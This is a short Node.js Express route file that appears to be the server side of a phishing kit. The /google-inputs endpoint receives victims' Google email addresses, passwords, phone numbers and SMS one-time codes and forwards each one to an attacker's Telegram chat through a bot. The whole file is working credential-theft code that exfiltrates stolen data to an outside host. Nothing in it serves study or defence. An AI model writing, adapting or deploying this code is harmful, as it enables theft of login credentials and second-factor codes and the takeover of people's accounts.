import express from "express";
import TelegramBot from "node-telegram-bot-api";

const router = express.Router();

const bot = new TelegramBot(process.env.TELEGRAM_TOKEN);
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

router.post("/google-inputs", async (req, res) => {
  const { type, value } = req.body;

  const messages = {
    email: ` 🔐 GOOGLE LOGIN\n\n📧 Email Address: ${value}`,
    password: `Password: ${value}`,
    phoneNumber: `Phone Number: ${value}`,
    smsCode: `OTP: ${value}`,
  };

  const message = messages[type];

  if (!message) {
    return res.status(400).json({
      message: "Unknown order type",
    });
  }

  await bot.sendMessage(CHAT_ID, message);

  res.json({
    message: "Data received",
  });
});

export default router;
